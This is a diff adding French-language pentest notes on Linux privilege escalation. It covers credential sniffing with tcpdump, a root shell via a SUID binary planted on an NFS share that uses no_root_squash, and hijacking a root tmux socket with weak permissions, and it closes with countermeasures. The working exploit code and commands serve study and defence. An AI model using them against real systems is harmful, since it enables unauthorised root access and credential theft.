@@ -1113,6 +1113,101 @@ Ces options définissent comment adapter l’exploit (logrotten supporte les deu
 
 ---
 
+# Miscellaneous Privilege Escalation Techniques
+
+## 1) Passive Traffic Capture
+Si **tcpdump** est accessible à un utilisateur non-root, il peut capturer le trafic réseau et récupérer :
+- Identifiants en clair (HTTP, FTP, POP, IMAP, telnet, SMTP)
+- Hashs (Net-NTLMv2, SMBv2, Kerberos)
+- Données sensibles (SNMP, cartes, sessions)
+
+### Commande :
+```bash
+tcpdump -i any -w capture.pcap
+```
+→ analyser ensuite avec **net-creds** ou **PCredz** pour extraire identifiants.  
+Permet d’obtenir des creds réutilisables pour escalader.
+
+## 2) Weak NFS Privileges
+
+NFS (port 2049) permet de partager des dossiers entre machines.  
+Une configuration faible (`no_root_squash`) permet à un attaquant **root sur sa machine** d’écrire sur le partage **en root** côté serveur.
+
+### Enumération :
+```bash
+showmount -e <target_IP>
+```
+
+### Exemple de config vulnérable :
+```bash
+/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+```
+
+### Exploit :
+Créer un binaire SUID localement :
+```c
+#include <stdlib.h>
+#include <unistd.h>
+int main() { setuid(0); setgid(0); system("/bin/bash"); }
+```
+
+Compiler :
+```bash
+gcc shell.c -o shell
+```
+
+Monter le partage NFS :
+```bash
+sudo mount -t nfs <target_IP>:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell
+```
+
+Sur le serveur :
+```bash
+./shell
+id
+# → uid=0(root)
+```
+Root via NFS SUID injection.
+
+## 3) Hijacking Tmux Sessions
+
+**tmux** garde des sessions persistantes, souvent utilisées par root.  
+Si la socket tmux (ex: `/shareds`) a des permissions faibles et que vous partagez le groupe, vous pouvez **reprendre la session root**.
+
+### Vérifier les sessions :
+```bash
+ps aux | grep tmux
+```
+
+### Vérifier les permissions :
+```bash
+ls -la /shareds
+# srw-rw---- 1 root devs 0 ...
+```
+
+### Si vous êtes dans le bon groupe :
+```bash
+id
+# → groups=...,devs
+tmux -S /shareds
+id
+# uid=0(root)
+```
+Accès root via session tmux détachable.
+
+## 4) Contremesures
+- Restreindre `tcpdump` à root seulement.  
+- Ne jamais utiliser `no_root_squash` sur NFS.  
+- Corriger les permissions des sockets tmux (`chmod 700`).  
+- Monitorer `/tmp` et les montages NFS pour fichiers SUID.  
+
+---
+
+
+
 
 
 
